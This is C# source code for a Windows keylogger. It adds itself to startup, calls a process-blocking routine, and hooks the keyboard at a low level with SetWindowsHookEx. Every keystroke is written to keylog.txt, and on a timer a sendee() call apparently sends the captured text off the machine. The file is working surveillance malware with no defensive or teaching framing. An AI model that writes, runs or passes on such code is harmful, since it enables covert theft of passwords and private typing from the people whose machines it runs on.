using System.Diagnostics;
using System.Runtime.InteropServices;

class InterceptKeys
{
    public static Logger.Text box = new Logger.Text();
    public static Logger.Tim timer = new Logger.Tim();
    public static Logger.AutoRun autoRun = new Logger.AutoRun();
    public static Logger.ProcessManager processManager = new Logger.ProcessManager();
    public static Logger.KeyHandler keyHandler = new Logger.KeyHandler();

    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;


    public static void Main()
    {
        autoRun.AddToStartup();

        processManager.block();

        _hookID = SetHook(_proc);

        Application.Run();
        UnhookWindowsHookEx(_hookID);

    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        string path = Convert.ToString(Directory.GetCurrentDirectory()) + "/keylog.txt";

        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);

            if ((Keys)vkCode == Keys.Back)
            {
                if (File.Exists(path))
                {
                    string text = "";
                    using (StreamReader sr = new StreamReader(path))
                    {
                        text = sr.ReadToEnd();
                    }
                    if (!string.IsNullOrEmpty(text))
                    {
                        text = text.Substring(0, text.Length - 1);
                        File.WriteAllText(path, text);
                    }
                }
            }
            else
            {
                Console.WriteLine((Keys)vkCode);
                box.tex = box.tex + keyHandler.GetKeyName((Keys)vkCode);
                timer.timing = DateTime.Now;
                if (timer.timing >= timer.newTime)
                {
                    using (StreamWriter outputFile = new StreamWriter(path))
                    {
                        outputFile.WriteLine(box.tex);
                        outputFile.Close();
                        timer.updateTime();
                    }
                    box.sendee();

                }
            }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}